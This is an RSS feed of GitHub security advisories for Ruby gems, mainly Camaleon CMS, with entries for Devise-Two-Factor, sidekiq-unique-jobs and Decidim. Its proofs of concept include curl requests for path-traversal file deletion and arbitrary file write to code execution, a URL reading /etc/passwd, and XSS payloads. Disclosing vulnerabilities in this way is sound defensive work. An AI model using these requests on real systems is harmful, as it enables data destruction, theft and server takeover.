<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rubygems.rss</id>
    <title>Security Advisory for Ruby gems hosted at RubyGems.org</title>
    <updated>2024-09-19T01:28:21.678Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems"/>
    <subtitle>Security Advisory for Ruby gems hosted at RubyGems.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[camaleon_cms] Camaleon CMS vulnerable to remote code execution through code injection (GHSL-2024-185)]]></title>
        <id>https://github.com/advisories/GHSA-7x4w-cj9r-h4v9</id>
        <link href="https://github.com/advisories/GHSA-7x4w-cj9r-h4v9"/>
        <updated>2024-09-18T15:48:33.000Z</updated>
        <content type="html"><![CDATA[<p>The <a href="https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/controllers/camaleon_cms/admin/media_controller.rb#L51-L52">actions</a> defined inside of the MediaController class do not check whether a given path is inside a certain path (e.g. inside the media folder). If an attacker performed an account takeover of an administrator account (See: GHSL-2024-184) they could delete arbitrary files or folders on the server hosting Camaleon CMS. The <a href="https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/controllers/camaleon_cms/admin/media_controller.rb#L64-L65">crop_url</a> action might make arbitrary file writes (similar impact to GHSL-2024-182) for any authenticated user possible, but it doesn't seem to work currently.</p>
<p>Arbitrary file deletion can be exploited with following code path: The parameter folder flows from the actions method:</p>
<pre><code class="language-ruby">  def actions
    authorize! :manage, :media if params[:media_action] != 'crop_url'
    params[:folder] = params[:folder].gsub('//', '/') if params[:folder].present?
    case params[:media_action]
    [..]
    when 'del_file'
      cama_uploader.delete_file(params[:folder].gsub('//', '/'))
      render plain: ''
</code></pre>
<p>into the method delete_file of the CamaleonCmsLocalUploader class (when files are uploaded locally):</p>
<pre><code class="language-ruby">def delete_file(key)
  file = File.join(@root_folder, key)
  FileUtils.rm(file) if File.exist? file
  @instance.hooks_run('after_delete', key)
  get_media_collection.find_by_key(key).take.destroy
end
</code></pre>
<p>Where it is joined in an unchecked manner with the root folder and then deleted.</p>
<p><strong>Proof of concept</strong>
The following request would delete the file README.md in the top folder of the Ruby on Rails application. (The values for auth_token, X-CSRF-Token and _cms_session would also need to be replaced with authenticated values in the curl command below)</p>
<pre><code>curl --path-as-is -i -s -k -X $'POST' \
    -H $'X-CSRF-Token: [..]' -H $'User-Agent: Mozilla/5.0' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Accept: */*' -H $'Connection: keep-alive' \
    -b $'auth_token=[..]; _cms_session=[..]' \
    --data-binary $'versions=&amp;thumb_size=&amp;formats=&amp;media_formats=&amp;dimension=&amp;private=&amp;folder=..%2F..%2F..%2FREADME.md&amp;media_action=del_file' \
    $'https://&lt;camaleon-host&gt;/admin/media/actions?actions=true'
</code></pre>
<p><strong>Impact</strong>
This issue may lead to a defective CMS or system.</p>
<p><strong>Remediation</strong>
Normalize all file paths constructed from untrusted user input before using them and check that the resulting path is inside the targeted directory. Additionally, do not allow character sequences such as .. in untrusted input that is used to build paths.</p>
<p><strong>See also:</strong></p>
<p><a href="https://codeql.github.com/codeql-query-help/ruby/rb-path-injection/">CodeQL: Uncontrolled data used in path expression</a>
<a href="https://owasp.org/www-community/attacks/Path_Traversal">OWASP: Path Traversal</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-7x4w-cj9r-h4v9">https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-7x4w-cj9r-h4v9</a></li>
<li><a href="https://github.com/owen2345/camaleon-cms/commit/f5d032549fa0a204d06e738caf2663607967dee2">https://github.com/owen2345/camaleon-cms/commit/f5d032549fa0a204d06e738caf2663607967dee2</a></li>
<li><a href="https://github.com/advisories/GHSA-7x4w-cj9r-h4v9">https://github.com/advisories/GHSA-7x4w-cj9r-h4v9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7x4w-cj9r-h4v9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-18T15:47:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[camaleon_cms] Camaleon CMS vulnerable to stored XSS through user file upload (GHSL-2024-184)]]></title>
        <id>https://github.com/advisories/GHSA-r9cr-qmfw-pmrc</id>
        <link href="https://github.com/advisories/GHSA-r9cr-qmfw-pmrc"/>
        <updated>2024-09-18T15:47:58.000Z</updated>
        <content type="html"><![CDATA[<p>A stored cross-site scripting has been found in the image upload functionality that can be used by normal registered users: It is possible to upload a SVG image containing JavaScript and it's also possible to upload a HTML document when the format parameter is manually changed to <a href="https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/uploaders/camaleon_cms_uploader.rb#L105-L106">documents</a> or a string of an <a href="https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/uploaders/camaleon_cms_uploader.rb#L110-L111">unsupported format</a>. If an authenticated user or administrator visits that uploaded image or document malicious JavaScript can be executed on their behalf (e.g. changing or deleting content inside of the CMS.)</p>
<p>Proof of concept
Login as a normal user (if user signup is enabled).
Go to the user's profile.
And upload the following profile picture via drag and drop.
The content of the SVG file could be as follows (e.g. name it test-xss.svg):</p>

<p><svg version="1.1" viewBox="0 0 198.4375 52.916666" height="500" width="500" xmlns="http://www.w3.org/2000/svg">
  <g transform="translate(-9.8676114,4.8833333)">
    <path transform="scale(1,-1)" style="fill:#131f6b;fill-opacity:1;stroke-width:0.05937638" d="m 107.79557,-10.430538 -7.33315,-0.02213 -3.647402,-6.361755 3.685742,-6.339624 7.33314,0.02213 3.64741,6.361756 z"></path>
  
  
  </g>
</svg>
The server might fail with a 500 internal server error, but the uploaded image should be available at a location like https:///media/1/test-xss-cookie.svg. If an authenticated user or administrator accesses that link their auth_token is reflected. Since the auth_token cookie contains a static <a href="https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/models/concerns/camaleon_cms/user_methods.rb#L18-L19">auth token</a> value that only changes when a user changes their password.</p>
<p>Impact
This issue may lead to account takeover due to reflected Cross-site scripting (XSS).</p>
<p>Remediation
Only allow the upload of safe files such as PNG, TXT and others or serve all "unsafe" files such as SVG and other files with a content-disposition: attachment header, which should prevent browsers from displaying them.</p>
<p>Additionally, a <a href="https://web.dev/articles/csp">Content security policy (CSP)</a> can be created that disallows inlined script. (Other parts of the application might need modification to continue functioning.)</p>
<p>To prevent the theft of the auth_token it could be marked with HttpOnly. This would however not prevent that actions could be performed as the authenticated user/administrator. Furthermore, it could make sense to use the authentication provided by Ruby on Rails, so that stolen tokens cannot be used anymore after some time.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-r9cr-qmfw-pmrc">https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-r9cr-qmfw-pmrc</a></li>
<li><a href="https://github.com/owen2345/camaleon-cms/commit/b18fbc74f3ecd98a1f781d015f5466ef16b1425b">https://github.com/owen2345/camaleon-cms/commit/b18fbc74f3ecd98a1f781d015f5466ef16b1425b</a></li>
<li><a href="https://github.com/advisories/GHSA-r9cr-qmfw-pmrc">https://github.com/advisories/GHSA-r9cr-qmfw-pmrc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r9cr-qmfw-pmrc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-18T15:47:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[camaleon_cms] Camaleon CMS vulnerable to arbitrary path traversal (GHSL-2024-183)]]></title>
        <id>https://github.com/advisories/GHSA-cp65-5m9r-vc2c</id>
        <link href="https://github.com/advisories/GHSA-cp65-5m9r-vc2c"/>
        <updated>2024-09-18T19:24:19.000Z</updated>
        <content type="html"><![CDATA[<p>A path traversal vulnerability accessible via MediaController's download_private_file method allows authenticated users to download any file on the web server Camaleon CMS is running on (depending on the file permissions).</p>
<p>In the <a href="https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/controllers/camaleon_cms/admin/media_controller.rb#L28">download_private_file</a> method:</p>
<pre><code class="language-ruby">def download_private_file
  cama_uploader.enable_private_mode!

  file = cama_uploader.fetch_file("private/#{params[:file]}")

  send_file file, disposition: 'inline'
end
</code></pre>
<p>The file parameter is passed to the <a href="https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/uploaders/camaleon_cms_local_uploader.rb#L27">fetch_file</a> method of the CamaleonCmsLocalUploader class (when files are uploaded locally):</p>
<pre><code class="language-ruby">def fetch_file(file_name)
  raise ActionController::RoutingError, 'File not found' unless file_exists?(file_name)

  file_name
end
</code></pre>
<p>If the file exists it's passed back to the download_private_file method where the file is sent to the user via <a href="https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/controllers/camaleon_cms/admin/media_controller.rb#L33-L34">send_file</a>.</p>
<p>Proof of concept
An authenticated user can download the /etc/passwd file by visiting an URL such as:</p>
<p>https:///admin/media/download_private_file?file=../../../../../../etc/passwd
Impact
This issue may lead to Information Disclosure.</p>
<p>Remediation
Normalize file paths constructed from untrusted user input before using them and check that the resulting path is inside the targeted directory. Additionally, do not allow character sequences such as .. in untrusted input that is used to build paths.</p>
<p>See also:</p>
<p><a href="https://codeql.github.com/codeql-query-help/ruby/rb-path-injection/">CodeQL: Uncontrolled data used in path expression</a>
<a href="https://owasp.org/www-community/attacks/Path_Traversal">OWASP: Path Traversal</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-cp65-5m9r-vc2c">https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-cp65-5m9r-vc2c</a></li>
<li><a href="https://github.com/owen2345/camaleon-cms/commit/071b1b09d6d61ab02a5960b1ccafd9d9c2155a3e">https://github.com/owen2345/camaleon-cms/commit/071b1b09d6d61ab02a5960b1ccafd9d9c2155a3e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-46987">https://nvd.nist.gov/vuln/detail/CVE-2024-46987</a></li>
<li><a href="https://codeql.github.com/codeql-query-help/ruby/rb-path-injection">https://codeql.github.com/codeql-query-help/ruby/rb-path-injection</a></li>
<li><a href="https://owasp.org/www-community/attacks/Path_Traversal">https://owasp.org/www-community/attacks/Path_Traversal</a></li>
<li><a href="https://www.reddit.com/r/rails/comments/1exwtdm/camaleon_cms_281_has_been_released">https://www.reddit.com/r/rails/comments/1exwtdm/camaleon_cms_281_has_been_released</a></li>
<li><a href="https://github.com/advisories/GHSA-cp65-5m9r-vc2c">https://github.com/advisories/GHSA-cp65-5m9r-vc2c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cp65-5m9r-vc2c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-18T15:46:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[camaleon_cms] Camaleon CMS affected by arbitrary file write to RCE (GHSL-2024-182)]]></title>
        <id>https://github.com/advisories/GHSA-wmjg-vqhv-q5p5</id>
        <link href="https://github.com/advisories/GHSA-wmjg-vqhv-q5p5"/>
        <updated>2024-09-18T19:24:04.000Z</updated>
        <content type="html"><![CDATA[<p>An arbitrary file write vulnerability accessible via the upload method of the MediaController allows authenticated users to write arbitrary files to any location on the web server Camaleon CMS is running on (depending on the permissions of the underlying filesystem). E.g. This can lead to a delayed remote code execution in case an attacker is able to write a Ruby file into the config/initializers/ subfolder of the Ruby on Rails application.</p>
<p>Once a user upload is started via the <a href="https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/controllers/camaleon_cms/admin/media_controller.rb#L86-L87">upload</a> method, the file_upload and the folder parameter</p>
<pre><code class="language-ruby">def upload(settings = {})
  params[:dimension] = nil if params[:skip_auto_crop].present?
  f = { error: 'File not found.' }
  if params[:file_upload].present?
    f = upload_file(params[:file_upload],
                    { folder: params[:folder], dimension: params['dimension'], formats: params[:formats], versions: params[:versions],
                      thumb_size: params[:thumb_size] }.merge(settings))
  end
  [..]
end
</code></pre>
<p>are passed to the <a href="https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/helpers/camaleon_cms/uploader_helper.rb#L23-L24">upload_file</a> method. Inside that method the given settings are <a href="https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/helpers/camaleon_cms/uploader_helper.rb#L41-L42">merged</a> with some presets. The file format is <a href="https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/helpers/camaleon_cms/uploader_helper.rb#L61-L62">checked against</a> the formats settings we can override with the formats parameters.</p>
<pre><code class="language-ruby"># formats validations
  return { error: "#{ct('file_format_error')} (#{settings[:formats]})" } unless cama_uploader.class.validate_file_format(
    uploaded_io.path, settings[:formats]
 )
</code></pre>
<p>Our given folder is then <a href="https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/helpers/camaleon_cms/uploader_helper.rb#L73-L74">passed unchecked</a> to the Cama_uploader:</p>
<pre><code class="language-ruby">key = File.join(settings[:folder], settings[:filename]).to_s.cama_fix_slash
res = cama_uploader.add_file(settings[:uploaded_io], key, { same_name: settings[:same_name] })
</code></pre>
<p>In the <a href="https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/uploaders/camaleon_cms_local_uploader.rb#L77">add_file</a> method of CamaleonCmsLocalUploader this key argument containing the unchecked path is then used to write the file to the file system:</p>
<pre><code class="language-ruby">def add_file(uploaded_io_or_file_path, key, args = {})
  [..]
  upload_io = uploaded_io_or_file_path.is_a?(String) ? File.open(uploaded_io_or_file_path) : uploaded_io_or_file_path
  File.open(File.join(@root_folder, key), 'wb') { |file| file.write(upload_io.read) }
  [..]
end
</code></pre>
<p>Proof of concept
Precondition: A valid account of a registered user is required. (The values for auth_token and _cms_session need to be replaced with authenticated values in the curl command below)</p>
<p>curl --path-as-is -i -s -k -X $'POST' <br> -H $'User-Agent: Mozilla/5.0' -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary80dMC9jX3srWAsga' -H $'Accept: <em>/</em>' -H $'Connection: keep-alive' <br>    -b $'auth_token=[..]; _cms_session=[..]' <br>    --data-binary $'------WebKitFormBoundary80dMC9jX3srWAsga\x0d\x0aContent-Disposition: form-data; name="file_upload"; filename="test.rb"\x0d\x0aContent-Type: text/x-ruby-script\x0d\x0a\x0d\x0aputs "================================="\x0aputs "================================="\x0aputs "= COMPROMISED                   ="\x0aputs "================================="\x0aputs "================================="\x0d\x0a------WebKitFormBoundary80dMC9jX3srWAsga\x0d\x0aContent-Disposition: form-data; name="folder"\x0d\x0a\x0d\x0a../../../config/initializers/\x0d\x0a------WebKitFormBoundary80dMC9jX3srWAsga\x0d\x0aContent-Disposition: form-data; name="skip_auto_crop"\x0d\x0a\x0d\x0atrue\x0d\x0a------WebKitFormBoundary80dMC9jX3srWAsga--\x0d\x0a' <br>    $'https:///admin/media/upload?actions=false'
Note that the upload form field formats was removed so that Camaleon CMS accepts any file. The folder was set to ../../../config/initializers/so that following Ruby script is written into the initializers folder of the Rails web app:</p>
<p>puts "================================="
puts "================================="
puts "= COMPROMISED                   ="
puts "================================="
puts "================================="
Once Camaleon CMS is restarted following output will be visible in the log:</p>
<h1 id="">=================================</h1>
<h1 id="-compromised-------------------">= COMPROMISED                   =</h1>
<p>=================================
Impact
This issue may lead up to Remote Code Execution (RCE) via arbitrary file write.</p>
<p>Remediation
Normalize file paths constructed from untrusted user input before using them and check that the resulting path is inside the targeted directory. Additionally, do not allow character sequences such as .. in untrusted input that is used to build paths.</p>
<p>See also:</p>
<p><a href="https://codeql.github.com/codeql-query-help/ruby/rb-path-injection/">CodeQL: Uncontrolled data used in path expression</a>
<a href="https://owasp.org/www-community/attacks/Path_Traversal">OWASP: Path Traversal</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-wmjg-vqhv-q5p5">https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-wmjg-vqhv-q5p5</a></li>
<li><a href="https://github.com/owen2345/camaleon-cms/commit/b3b12b1e4a9e3fccaf5bb4330820fa7f8744e6bd">https://github.com/owen2345/camaleon-cms/commit/b3b12b1e4a9e3fccaf5bb4330820fa7f8744e6bd</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-46986">https://nvd.nist.gov/vuln/detail/CVE-2024-46986</a></li>
<li><a href="https://codeql.github.com/codeql-query-help/ruby/rb-path-injection">https://codeql.github.com/codeql-query-help/ruby/rb-path-injection</a></li>
<li><a href="https://owasp.org/www-community/attacks/Path_Traversal">https://owasp.org/www-community/attacks/Path_Traversal</a></li>
<li><a href="https://www.reddit.com/r/rails/comments/1exwtdm/camaleon_cms_281_has_been_released">https://www.reddit.com/r/rails/comments/1exwtdm/camaleon_cms_281_has_been_released</a></li>
<li><a href="https://github.com/advisories/GHSA-wmjg-vqhv-q5p5">https://github.com/advisories/GHSA-wmjg-vqhv-q5p5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wmjg-vqhv-q5p5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-18T14:39:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[devise-two-factor] Devise-Two-Factor Authentication Uses Insufficient Default OTP Shared Secret Length]]></title>
        <id>https://github.com/advisories/GHSA-qjxf-mc72-wjr2</id>
        <link href="https://github.com/advisories/GHSA-qjxf-mc72-wjr2"/>
        <updated>2024-09-17T21:31:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Under the default configuration, Devise-Two-Factor versions &gt;= 2.2.0 &amp; &lt; 6.0.0 generate TOTP shared secrets that are 120 bits instead of the 128-bit minimum defined by <a href="https://datatracker.ietf.org/doc/html/rfc4226">RFC 4226</a>. Using a shared secret shorter than the minimum to generate a multi-factor authentication code could make it easier for an attacker to guess the shared secret and generate valid TOTP codes.</p>
<h3 id="remediation">Remediation</h3>
<p>Devise-Two-Factor should be upgraded to version v6.0.0 as soon as possible. After upgrading, the length of shared secrets and TOTP URLs generated by the library will increase since the new shared secrets will be longer.</p>
<p>If upgrading is not possible, you can override the default <code>otp_secret_length</code> attribute in the model when configuring <code>two_factor_authenticable</code> and set it to a value of at least 26 to ensure newly generated shared secrets are at least 128-bits long.</p>
<p>After upgrading or implementing the workaround, applications using Devise-Two-Factor may wish to migrate users to the new OTP length to provide increased protection for those accounts. Turning off OTP for users by setting <code>otp_required_for_login</code> to false is not recommended since it would leave accounts unprotected. However, you may wish to implement application logic that checks the length of a user's shared secret and prompts users to re-enroll in OTP.</p>
<h3 id="background">Background</h3>
<p>Devise-Two-Factor uses <a href="https://github.com/mdp/rotp">ROTP</a> to generate shared secrets for TOTP. In ROTP &lt; 5.0.0, the first argument to the <code>ROTP::Base32#random_base32</code> function represented the number of bytes to read from SecureRandom which were then returned as a base32-encoded string. In ROTP 5.1.0, this function was changed so that the first argument now represents the length of the base32-encoded string returned by the function instead of the number of bytes to read from SecureRandom resulting in a shorter key being generated for the same input value. (<a href="https://github.com/mdp/rotp/commit/c6c24ab894e7c2b1579d45ac82c41454d1e98227">https://github.com/mdp/rotp/commit/c6c24ab894e7c2b1579d45ac82c41454d1e98227</a>).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/devise-two-factor/devise-two-factor/security/advisories/GHSA-qjxf-mc72-wjr2">https://github.com/devise-two-factor/devise-two-factor/security/advisories/GHSA-qjxf-mc72-wjr2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8796">https://nvd.nist.gov/vuln/detail/CVE-2024-8796</a></li>
<li><a href="https://github.com/devise-two-factor/devise-two-factor/commit/cc6f34423d9c6af9f3e02be478c3c40dc7462e19">https://github.com/devise-two-factor/devise-two-factor/commit/cc6f34423d9c6af9f3e02be478c3c40dc7462e19</a></li>
<li><a href="https://github.com/advisories/GHSA-qjxf-mc72-wjr2">https://github.com/advisories/GHSA-qjxf-mc72-wjr2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qjxf-mc72-wjr2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T21:31:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sidekiq-unique-jobs] Cross Site Scripting vulnerability in Contribsys Sidekiq ]]></title>
        <id>https://github.com/advisories/GHSA-fhx8-5c23-x7x5</id>
        <link href="https://github.com/advisories/GHSA-fhx8-5c23-x7x5"/>
        <updated>2024-09-17T22:26:47.000Z</updated>
        <content type="html"><![CDATA[<p>Cross Site Scripting vulnerability in Contribsys Sidekiq v.6.5.8 allows a remote attacker to obtain sensitive information via a crafted URL to the filter functions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mhenrixon/sidekiq-unique-jobs/security/advisories/GHSA-cmh9-rx85-xj38">https://github.com/mhenrixon/sidekiq-unique-jobs/security/advisories/GHSA-cmh9-rx85-xj38</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46950">https://nvd.nist.gov/vuln/detail/CVE-2023-46950</a></li>
<li><a href="https://github.com/mhenrixon/sidekiq-unique-jobs/pull/829">https://github.com/mhenrixon/sidekiq-unique-jobs/pull/829</a></li>
<li><a href="https://github.com/mhenrixon/sidekiq-unique-jobs/releases/tag/v8.0.7">https://github.com/mhenrixon/sidekiq-unique-jobs/releases/tag/v8.0.7</a></li>
<li><a href="https://www.mgm-sp.com/cve/sidekiq-unique-jobs-reflected-xss-cve-2023-46950-cve-2023-46951">https://www.mgm-sp.com/cve/sidekiq-unique-jobs-reflected-xss-cve-2023-46950-cve-2023-46951</a></li>
<li><a href="https://github.com/mhenrixon/sidekiq-unique-jobs/commit/cd09ba6108f98973b6649a6149790c3d4502b4cc">https://github.com/mhenrixon/sidekiq-unique-jobs/commit/cd09ba6108f98973b6649a6149790c3d4502b4cc</a></li>
<li><a href="https://github.com/mhenrixon/sidekiq-unique-jobs/commit/ec3afd920c1b55843c72f748a87baac7f8be82ed">https://github.com/mhenrixon/sidekiq-unique-jobs/commit/ec3afd920c1b55843c72f748a87baac7f8be82ed</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sidekiq-unique-jobs/CVE-2023-46950.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sidekiq-unique-jobs/CVE-2023-46950.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-fhx8-5c23-x7x5">https://github.com/advisories/GHSA-fhx8-5c23-x7x5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fhx8-5c23-x7x5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-01T15:31:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sidekiq-unique-jobs] Cross Site Scripting vulnerability in Contribsys Sidekiq ]]></title>
        <id>https://github.com/advisories/GHSA-fhx8-5c23-x7x5</id>
        <link href="https://github.com/advisories/GHSA-fhx8-5c23-x7x5"/>
        <updated>2024-09-17T22:26:47.000Z</updated>
        <content type="html"><![CDATA[<p>Cross Site Scripting vulnerability in Contribsys Sidekiq v.6.5.8 allows a remote attacker to obtain sensitive information via a crafted URL to the filter functions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mhenrixon/sidekiq-unique-jobs/security/advisories/GHSA-cmh9-rx85-xj38">https://github.com/mhenrixon/sidekiq-unique-jobs/security/advisories/GHSA-cmh9-rx85-xj38</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46950">https://nvd.nist.gov/vuln/detail/CVE-2023-46950</a></li>
<li><a href="https://github.com/mhenrixon/sidekiq-unique-jobs/pull/829">https://github.com/mhenrixon/sidekiq-unique-jobs/pull/829</a></li>
<li><a href="https://github.com/mhenrixon/sidekiq-unique-jobs/releases/tag/v8.0.7">https://github.com/mhenrixon/sidekiq-unique-jobs/releases/tag/v8.0.7</a></li>
<li><a href="https://www.mgm-sp.com/cve/sidekiq-unique-jobs-reflected-xss-cve-2023-46950-cve-2023-46951">https://www.mgm-sp.com/cve/sidekiq-unique-jobs-reflected-xss-cve-2023-46950-cve-2023-46951</a></li>
<li><a href="https://github.com/mhenrixon/sidekiq-unique-jobs/commit/cd09ba6108f98973b6649a6149790c3d4502b4cc">https://github.com/mhenrixon/sidekiq-unique-jobs/commit/cd09ba6108f98973b6649a6149790c3d4502b4cc</a></li>
<li><a href="https://github.com/mhenrixon/sidekiq-unique-jobs/commit/ec3afd920c1b55843c72f748a87baac7f8be82ed">https://github.com/mhenrixon/sidekiq-unique-jobs/commit/ec3afd920c1b55843c72f748a87baac7f8be82ed</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sidekiq-unique-jobs/CVE-2023-46950.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sidekiq-unique-jobs/CVE-2023-46950.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-fhx8-5c23-x7x5">https://github.com/advisories/GHSA-fhx8-5c23-x7x5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fhx8-5c23-x7x5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-01T15:31:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[decidim]  Decidim::Admin vulnerable to cross-site scripting (XSS) in the admin panel with QuillJS WYSWYG editor]]></title>
        <id>https://github.com/advisories/GHSA-vvqw-fqwx-mqmm</id>
        <link href="https://github.com/advisories/GHSA-vvqw-fqwx-mqmm"/>
        <updated>2024-09-17T22:27:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The WYSWYG editor QuillJS is subject to potential XSS attach in case the attacker manages to modify the HTML before being uploaded to the server.</p>
<p>The attacker is able to change e.g. to &lt;svg onload=alert('XSS')&gt; if they know how to craft these requests themselves. </p>
<h3 id="patches">Patches</h3>
<p>N/A</p>
<h3 id="workarounds">Workarounds</h3>
<p>Review the user accounts that have access to the admin panel (i.e. general Administrators, and participatory space's Administrators) and remove access to them if they don't need it. </p>
<p>Disable the "Enable rich text editor for participants" setting in the admin dashboard</p>
<h3 id="references">References</h3>
<p>OWASP ASVS v4.0.3-5.1.3</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/decidim/decidim/security/advisories/GHSA-vvqw-fqwx-mqmm">https://github.com/decidim/decidim/security/advisories/GHSA-vvqw-fqwx-mqmm</a></li>
<li><a href="https://github.com/decidim/decidim/commit/47adca81cabea898005ec07b130b008f2a2be99f">https://github.com/decidim/decidim/commit/47adca81cabea898005ec07b130b008f2a2be99f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39910">https://nvd.nist.gov/vuln/detail/CVE-2024-39910</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/decidim/CVE-2024-39910.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/decidim/CVE-2024-39910.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-vvqw-fqwx-mqmm">https://github.com/advisories/GHSA-vvqw-fqwx-mqmm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vvqw-fqwx-mqmm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-16T17:17:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[decidim-admin] Decidim::Admin vulnerable to cross-site scripting (XSS) in the admin activity log]]></title>
        <id>https://github.com/advisories/GHSA-rx9f-5ggv-5rh6</id>
        <link href="https://github.com/advisories/GHSA-rx9f-5ggv-5rh6"/>
        <updated>2024-09-17T22:27:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The admin panel is subject to potential XSS attach in case an admin assigns a valuator to a proposal, or does any other action that generates an admin activity log where one of the resources has an XSS crafted. </p>
<h3 id="patches">Patches</h3>
<p>N/A</p>
<h3 id="workarounds">Workarounds</h3>
<p>Redirect the pages /admin and /admin/logs to other admin pages to prevent this access (i.e. <code>/admin/organization/edit</code>)</p>
<h3 id="references">References</h3>
<p>OWASP ASVS v4.0.3-5.1.3</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/decidim/decidim/security/advisories/GHSA-rx9f-5ggv-5rh6">https://github.com/decidim/decidim/security/advisories/GHSA-rx9f-5ggv-5rh6</a></li>
